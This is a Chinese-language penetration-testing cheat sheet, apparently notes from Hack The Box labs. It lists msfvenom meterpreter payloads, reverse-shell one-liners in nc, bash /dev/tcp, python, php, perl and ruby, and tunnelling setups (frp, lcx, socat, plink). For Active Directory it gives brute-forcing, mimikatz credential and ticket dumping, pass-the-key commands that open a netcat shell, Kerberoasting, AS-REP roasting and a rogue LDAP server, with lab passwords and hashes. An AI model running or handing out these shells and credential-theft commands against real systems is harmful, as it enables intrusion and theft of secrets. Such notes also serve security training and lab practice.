<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f elf &gt; shell.elf</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>portfwd -l 2222 -p 8080 -r 127.0.0.1 (本地服务端口转发/netstat)</p>
</li>
<li>
<p>earthworm(socks5)</p>
<ul>
<li>访问本地服务</li>
</ul>
</li>
<li>
<p>ngork</p>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://ngrok.com/">https://ngrok.com/</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://www.tunnelnat.com/">https://www.tunnelnat.com/</a></p>
</li>
</ul>
</li>
<li>
<p>reGeorg</p>
</li>
<li>
<p>frp</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.56.104</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[sock5_1]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 45555</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; user</span><br><span class="line">plugin_passwd &#x3D; pass</span><br><span class="line">#####################</span><br><span class="line">#frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pass &#x3D; admin</span><br></pre></td></tr></table></figure>
<ul>
<li>nps
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></li>
</ul>
</li>
<li>lcx</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lcx配合meterpreter进行公网反弹Shell</span><br><span class="line">Server上执行lcx -listen 8888 9999</span><br><span class="line">本地执行lcx -slave Server 8888 Local_IP 7777</span><br><span class="line">并在MSF监听Local_IP上的7777端口</span><br><span class="line">(注意这里不能用127.0.0.1) </span><br><span class="line">目标机器上meterpreter反弹至Server的8888端口</span><br></pre></td></tr></table></figure>
<ul>
<li>proxychain</li>
<li>proxifier</li>
<li>sockscap</li>
<li>socat
<ul>
<li><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></li>
</ul>
</li>
<li>plink
<ul>
<li><code>plink.exe -ssh root@192.168.0.1 -pw password -R 1234:127.0.0.1:3306</code></li>
</ul>
</li>
<li>sshuttle
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/sshuttle/sshuttle">https://github.com/sshuttle/sshuttle</a></li>
</ul>
</li>
</ul>
<h4 id="shell-2"><a class="markdownIt-Anchor" href="#shell-2"></a> Shell</h4>
<ul>
<li>nc</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc.traditional是最早的版本(v1.10-41.1)，该版本具有&#96;&#96;-e&#96;&#96;的选项，用于反弹shell十分方便</span><br><span class="line">ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有&#96;&#96;-e&#96;&#96;的选项，无法用于反弹shell</span><br><span class="line">ncat的版本则比较新，集成于nmap中</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正向Shell</span></span><br><span class="line">nc -lvvp 8080 -t -e /bin/bash</span><br><span class="line">.............................</span><br><span class="line">nc 192.168.0.1 8000</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i 2&gt;&amp;1 | nc 192.168.0.1 8080</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.1 8080 &gt;/tmp/f</span><br><span class="line">nc -e /bin/bash 192.168.0.1 8080</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure>
<ul>
<li>bash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure>
<ul>
<li>python</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.1&#x27;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>php</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1&quot;)&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>perl</li>
</ul>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ruby</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3>
<ul>
<li>命令多条分隔/命令注入: ;</li>
<li>Secure String</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$password &#x3D; ConvertTo-SecureString &#39;P@ssw0rd&#39; -AsPlainText -Force</span><br><span class="line">$Ptr &#x3D; [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)</span><br><span class="line">$result &#x3D; [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)</span><br><span class="line">$result </span><br></pre></td></tr></table></figure>
<hr />
<h1 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h1>
<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
<ul>
<li>nmap</li>
<li>dirb</li>
<li>wfuzz
<ul>
<li>VHOST: <code>wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; --hl 154</code></li>
</ul>
</li>
<li>enum4linux
<ul>
<li><code>enum4linux 10.10.10.248</code></li>
<li><a target="_blank" rel="noopener" href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></li>
</ul>
</li>
<li>smbmap
<ul>
<li><code>smbmap -H 10.10.10.248 -u &quot;test&quot;</code></li>
<li><code>smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence</code></li>
</ul>
</li>
<li>smbclient
<ul>
<li><code>smbclient //10.10.10.248/users -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'</code></li>
<li>下载路径</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mask &quot;&quot;</span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget active.htb</span><br></pre></td></tr></table></figure>
<ul>
<li>kerbrute</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -dc-ip 10.10.10.248 -d intelligence.htb users</span><br></pre></td></tr></table></figure>
<ul>
<li>bloodhound</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -O</span><br><span class="line">curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O</span><br><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br></pre></td></tr></table></figure>
<ul>
<li>lookupsid</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py sql_svc:REGGIE1234ronnie@10.10.11.202</span><br></pre></td></tr></table></figure>
<ul>
<li>pywerview</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br></pre></td></tr></table></figure>
<ul>
<li>procdump</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./procdump64.exe -accepteula -ma 6216</span><br></pre></td></tr></table></figure>
<ul>
<li>crackmapexec
<ul>
<li>username: <code>crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p 'S@Ss!K@*t13' --users</code></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat">https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></li>
<li>AD</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get-aduser -filter * -server $dc_domain_name | format-table name,samaccountname -a</span><br><span class="line">get-aduser -identity $username -server $dc_domain_name -properties *</span><br><span class="line">get-adgroup -filter * -server $dc_domain_name | format-table name -a</span><br><span class="line">get-adgroup -identity $groupname -server $dc_domain_name</span><br><span class="line">get-adgroupmember -identity $groupname -server $dc_domain_name</span><br><span class="line">get-adobject</span><br><span class="line">get-addomain -server $dc_domain_name</span><br></pre></td></tr></table></figure>
<h2 id="爆破"><a class="markdownIt-Anchor" href="#爆破"></a> 爆破</h2>
<ul>
<li>爆破smb<br />
<code>crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876 --continue-on-success</code></li>
<li>爆破winrm<br />
<code>crackmapexec winrm 10.10.10.149 -d heist -u user -p pass</code></li>
</ul>
<h2 id="获取凭证"><a class="markdownIt-Anchor" href="#获取凭证"></a> 获取凭证</h2>
<h3 id="gmsadumper"><a class="markdownIt-Anchor" href="#gmsadumper"></a> gMSADumper</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py</span><br><span class="line">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248</span><br></pre></td></tr></table></figure>
<h3 id="allowed_to_delegate_to"><a class="markdownIt-Anchor" href="#allowed_to_delegate_to"></a> allowed_to_delegate_to</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br><span class="line">python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administrator</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 secretsdump.py -k dc.intelligence.htb -just-dc</span><br></pre></td></tr></table></figure>
<h3 id="gpp"><a class="markdownIt-Anchor" href="#gpp"></a> GPP</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br></pre></td></tr></table></figure>
<h3 id="portablekanban"><a class="markdownIt-Anchor" href="#portablekanban"></a> PortableKanban</h3>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">	<span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="mimikatz"><a class="markdownIt-Anchor" href="#mimikatz"></a> mimikatz</h3>
<p>SAM</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
<p>LSASS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">sekurlsa::msv</span><br></pre></td></tr></table></figure>
<p>LOGGED</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
<p>REGISTRY</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::secrets</span><br></pre></td></tr></table></figure>
<p>KERBEROS_KEYS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
<p>KERBEROS_TICKETS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br><span class="line">kerberos::ptt $ticket_file</span><br></pre></td></tr></table></figure>
<p>PASS_THE_KEY</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">sekurlsa::pth &#x2F;user:$username &#x2F;domain:$domain &#x2F;rc4:$rc4 &#x2F;run:&quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br><span class="line">sekurlsa::pth &#x2F;user:$username &#x2F;domain:$domain &#x2F;aes128:$aes128 &#x2F;run:&quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br><span class="line">sekurlsa::pth &#x2F;user:$username &#x2F;domain:$domain &#x2F;aes256:$aes256 &#x2F;run:&quot;nc64.exe -e cmd.exe $ip $port&quot;</span><br></pre></td></tr></table></figure>
<h3 id="kerberoasting"><a class="markdownIt-Anchor" href="#kerberoasting"></a> Kerberoasting</h3>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mi>G</mi><mi>S</mi><mi mathvariant="normal">_</mi><mi>T</mi><mi>i</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>t</mi><mo>=</mo><mi>R</mi><mi>C</mi><mn>4</mn><mo>−</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mo>=</mo><mi>T</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>m</mi><mi>p</mi><mo separator="true">,</mo><mi>K</mi><mi>e</mi><mi>y</mi><mo>=</mo><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>T</mi><mi>L</mi><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TGS\_Ticket = RC4-HMAC(Plain = Timestamp, Key = Server\_NTLM)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span><br />
Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Server_NTLM</p>
<ul>
<li>一般用于攻击服务用户账号</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span></span><br><span class="line">python GetUserSPNs.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span> -request-user <span class="variable">$spn_user</span> -save -outfile tgs</span><br><span class="line">hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\invoke-kerberoast</span><br><span class="line">invoke-kerberoast -outputformat hashcat</span><br></pre></td></tr></table></figure>
<h3 id="as-rep-roasting"><a class="markdownIt-Anchor" href="#as-rep-roasting"></a> AS-REP Roasting</h3>
<blockquote>
<p>Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.<br />
<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting">https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting</a></p>
</blockquote>
<ul>
<li>Username requiured</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/<span class="variable">$user</span> -request -outfile tgt</span><br><span class="line">python GetNPUsers.py -dc-ip <span class="variable">$ip</span> <span class="variable">$domain</span>/ -usersfile <span class="variable">$user_file</span> -request -outfile tgt</span><br><span class="line">hashcat -m 18200 tgt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<h3 id="获取运行程序-服务用户凭证"><a class="markdownIt-Anchor" href="#获取运行程序-服务用户凭证"></a> 获取运行程序、服务用户凭证</h3>
<p>监听</p>
<ul>
<li>responder</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure>
<ul>
<li>smbserver</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py -ip 10.10.*.* -smb2support BFL &#x2F;tmp</span><br></pre></td></tr></table></figure>
<ul>
<li>rogue ldap server</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd</span><br><span class="line">sudo dpkg-reconfigure -p low slapd</span><br><span class="line">echo -e &quot;#olcSaslSecProps.ldif\ndn: cn&#x3D;config\nreplace: olcSaslSecProps\nolcSaslSecProps: noanonymous,minssf&#x3D;0,passcred&quot; &gt; olcSaslSecProps.ldif</span><br><span class="line">sudo ldapmodify -Y EXTERNAL -H ldapi:&#x2F;&#x2F; -f .&#x2F;olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</span><br><span class="line">ldapsearch -H ldap:&#x2F;&#x2F; -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms</span><br><span class="line">sudo tcpdump -SX -i breachad tcp port 389</span><br></pre></td></tr></table></figure>
<p>服务</p>
<ul>
<li>Invoke-WebRequest</li>
</ul>
<p>访问域中web*域名80端口</p>
